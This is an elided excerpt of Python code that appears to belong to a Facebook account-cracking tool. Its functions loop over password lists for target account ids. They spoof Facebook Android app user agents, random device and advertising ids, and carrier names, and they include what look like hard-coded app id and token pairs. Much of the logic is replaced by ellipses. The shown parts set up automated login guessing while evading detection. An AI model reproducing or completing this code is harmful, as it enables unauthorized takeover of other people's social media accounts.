...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua ='[FBAN/katana-Android;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]'
...
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        ...
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+'[FBAN/katana-Android;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			ua_string = '[FBAN/katana-Android;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
